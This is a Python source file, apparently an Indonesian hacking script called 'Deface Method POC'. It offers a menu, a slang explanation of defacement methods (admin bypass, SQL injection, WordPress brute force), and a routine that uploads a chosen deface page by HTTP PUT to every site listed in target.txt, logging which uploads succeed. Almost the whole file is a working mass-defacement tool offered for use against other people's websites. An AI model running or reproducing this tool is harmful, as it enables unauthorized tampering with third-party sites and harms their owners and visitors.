#-*- coding: utf-8 -*-
import os.path,sys,requests,rich
from rich.panel import Panel
from rich.console import Console
b = '\033[31m'
h = '\033[32m'
m = '\033[00m'
def clear():
   os.system('clear')
def banner():
	Console(width=100).print(Panel('''[bold white][blue]▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
[purple]██░▄▄▀█░▄▄█░▄▄█░▄▄▀█▀▄▀█░▄▄██
[blue]██░██░█░▄▄█░▄██░▀▀░█░█▀█░▄▄██
[purple]██░▀▀░█▄▄▄█▄███▄██▄██▄██▄▄▄██
[blue]▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
[white]( [green]Deface Method [red]POC[white] )''',title='[bold white][green]>[purple]>[white]Infromation[purple]<[green]<'),justify="center")
def nonok():
   clear()
   banner()
   Console(width=100).print(Panel('[bold white][[green]01[white]] Pengertian Deface POC\n[white][[green]02[white]] Lanjut Deface\n[white][[red]00[white]] Exit',title='[bold white][green]>[purple]>[white]Menu[purple]<[green]<'))
   jir = input('input  :  ')
   if jir in ['01','1']:
      Console(width=50).print(Panel('''1. pengertian POC
POC = Proof OF Concept
Kata kata poc itu lahir pada tahun 1969 nan :v tapi booming
2. POC : Method
Poc method itu sering di gunakan pada orang yang gila nebas index geng :v
contoh saya yak :v saya sering cari poc baru buat nebas index :v
Contoh method poc deface :
1 Bypass admin
2 Sqli (Sql Injection)
3 WpBruteForce (WPBF) 3.POC : Listing
POC listing itu tempat dimana orang orang berbagi penemuan bug atau celah pada website geng :v contoh nya website berikut nih yang sering share poc
https://cxsecurity.com/''',title='Pengertian Deface POC'))
   elif jir in ['02','2']:
     main(banner)
   elif jir in ['00','0']:
      clear()
      exit()
def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   clear()
   banner()
   while True:
      try:
         a = x("\tEnter your script deface name: ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
   nonok() 
